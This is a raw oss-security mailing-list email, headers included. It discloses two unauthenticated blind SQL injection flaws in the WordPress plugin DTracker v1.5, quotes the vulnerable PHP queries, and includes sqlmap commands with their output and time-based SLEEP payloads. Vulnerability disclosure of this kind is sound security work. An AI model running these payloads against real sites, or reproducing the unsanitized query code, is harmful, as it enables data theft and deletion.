X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["3481" "Thursday" "9" "March" "2017" "07:57:13" "-0500" "Larry W. Cashdollar" "larry0@me.com" "<C3D0A2F5-941D-4030-9910-57C3E46053E1@me.com>" "82" "[oss-security] Multiple Blind SQL injection vulnerability in Wordpress Plugin DTracker v1.5" nil nil nil "3" "2017030912:57:13" "[oss-security] Multiple Blind SQL injection vulnerability in Wordpress Plugin DTracker v1.5" (number mark "U       larry0@me.co Mar  9   82/3481  " thread-indent "\"[oss-security] Multiple Blind SQL injection vulnerability in Wordpress Plugin DTracker v1.5\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 29911 invoked by uid 550); 9 Mar 2017 12:57:29 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 29879 invoked from network); 9 Mar 2017 12:57:28 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=me.com; s=4d515a;
	t=1489064236; bh=5w5J2pwijcJm9SpOvisrQTlOwZ1T0zVEoKDQJz9l1wk=;
	h=From:Content-type:Subject:Message-id:Date:To:MIME-version;
	b=bzRgt5TyKH2JSePFvK4mCQUHCl80z3ujA67PkBNYUIEVB8k39Izwf3bNaL0fjQ7sz
 9rh62t1RuUe91xbQjMwZRrvNhNPKJV2Hx3zJFh45gcQEI1HGsjq5PHnruQ/tervt+s
 ueAZif6puJBHbY9kCVofpPLkNZE19xPkQonalWBCSibRctQp+CguHreNbA+9jA+f1a
 rvj/fY0c4Cvh5m6aobfg06WDKVBVxgMExUqG0pwgId+ov9UUA0NBhfgg8UuFsz/PSC
 slB8S8XbnRuXOz0QFTLR23wplqLVoGBlGOJUc17Np94p986cmPrl758VW0Fc8xdlKU
 0XuzZCa6iXj6w==
X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10432:,,
 definitions=2017-03-09_09:,, signatures=0
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
 clxscore=1034 suspectscore=0 malwarescore=0 phishscore=0 adultscore=0
 bulkscore=0 classifier=spam adjust=0 reason=mlx scancount=1
 engine=8.0.1-1701120000 definitions=main-1703090098
From: "Larry W. Cashdollar" <larry0@me.com>
Content-type: text/plain; charset=utf-8
Content-transfer-encoding: quoted-printable
Message-id: <C3D0A2F5-941D-4030-9910-57C3E46053E1@me.com>
Date: Thu, 09 Mar 2017 07:57:13 -0500
To: Open Source Security <oss-security@lists.openwall.com>
MIME-version: 1.0 (Mac OS X Mail 9.3 \(3124\))
X-Mailer: Apple Mail (2.3124)
Subject: [oss-security] Multiple Blind SQL injection vulnerability in Wordpress Plugin
 DTracker v1.5

Title: Multiple Blind SQL injection vulnerability in Wordpress Plugin DTrac=
ker v1.5
Author: Larry W. Cashdollar, @_larry0
Date: 2017-03-08
CVE-IDs: CVE-2017-1002004 CVE-2017-1002005
Download Site: https://wordpress.org/plugins/dtracker/
Vendor: https://profiles.wordpress.org/dijo/
Vendor Notified: 2017-03-08
Vendor Contact: plugins@wordpress.org
Advisory: http://www.vapidlabs.com/advisory.php?v=3D183
Description: Track the details of the users downloading the pdf files from =
wordpress site.
Vulnerability:
CVE-2017-1002004:
In file ./dtracker/download.php user input isn't sanitized via the id varia=
ble before adding it to the end of an SQL query.

$doc_id         =3D $_GET['id'];
$file =3D $wpdb->get_results( "SELECT * FROM wp_posts WHERE ID =3D $doc_id =
" );

The user does not need to be authenticated to the Wordpress installation to=
 exploit this vulnerability.

CVE-2017-1002005:
In file ./dtracker/delete.php user input isn't sanitized via the contact_id=
 variable before adding it to the end of an SQL query.

$contact_id     =3D $_POST['contact_id']; //Contact ID to be deleted

$query  =3D "DELETE FROM wp_contacts WHERE id =3D $contact_id";
$wpdb->query($query); // Delete the contact

The user does not need to be authenticated to the Wordpress installation to=
 exploit this vulnerability.

Exploit Code:
	=E2=80=A2 $ sqlmap -u 'http://example.com/wordpress/wp-content/plugins/dtr=
acker/download.php?id=3D*'  --dbms mysql  --level 3 --risk 3
	=E2=80=A2 URI parameter '#1*' is vulnerable. Do you want to keep testing t=
he others (if any)? [y/N]=20
	=E2=80=A2 sqlmap identified the following injection point(s) with a total =
of 1410 HTTP(s) requests:
	=E2=80=A2 ---
	=E2=80=A2 Parameter: #1* (URI)
	=E2=80=A2     Type: AND/OR time-based blind
	=E2=80=A2     Title: MySQL >=3D 5.0.12 time-based blind - Parameter replace
	=E2=80=A2     Payload: http://192.168.0.169:80/wordpress/wp-content/plugin=
s/dtracker/download.php?id=3D(CASE WHEN (7148=3D7148) THEN SLEEP(5) ELSE 71=
48 END)
	=E2=80=A2 ---
	=E2=80=A2 [10:14:09] [INFO] the back-end DBMS is MySQL
	=E2=80=A2 web server operating system: Linux Ubuntu 16.04 (xenial)
	=E2=80=A2 web application technology: Apache 2.4.18
	=E2=80=A2 back-end DBMS: MySQL >=3D 5.0.12
	=E2=80=A2 [10:14:09] [WARNING] HTTP error codes detected during run:
	=E2=80=A2 404 (Not Found) - 14 times
	=E2=80=A2 [10:14:09] [INFO] fetched data logged to text files under '/home=
/larry/.sqlmap/output/example.com'
=09


	=E2=80=A2 $ sqlmap -u 'http://example.com/wordpress/wp-content/plugins/dtr=
acker/delete.php' --data 'contact_id=3D*'  --dbms mysql --risk 1 --level 3
	=E2=80=A2=20=20
	=E2=80=A2 (custom) POST parameter '#1*' is vulnerable. Do you want to keep=
 testing the others (if any)? [y/N]=20
	=E2=80=A2 sqlmap identified the following injection point(s) with a total =
of 831 HTTP(s) requests:
	=E2=80=A2 ---
	=E2=80=A2 Parameter: #1* ((custom) POST)
	=E2=80=A2     Type: AND/OR time-based blind
	=E2=80=A2     Title: MySQL >=3D 5.0.12 time-based blind - Parameter replac=
e (substraction)
	=E2=80=A2     Payload: contact_id=3D(SELECT * FROM (SELECT(SLEEP(5)))Vtrh)
	=E2=80=A2 ---
	=E2=80=A2 [11:53:27] [INFO] the back-end DBMS is MySQL
	=E2=80=A2 web server operating system: Linux Ubuntu 16.04 (xenial)
	=E2=80=A2 web application technology: Apache 2.4.18
	=E2=80=A2 back-end DBMS: MySQL >=3D 5.0.12
	=E2=80=A2 [11:53:27] [INFO] fetched data logged to text files under '/home=
/larry/.sqlmap/output/example.com'=
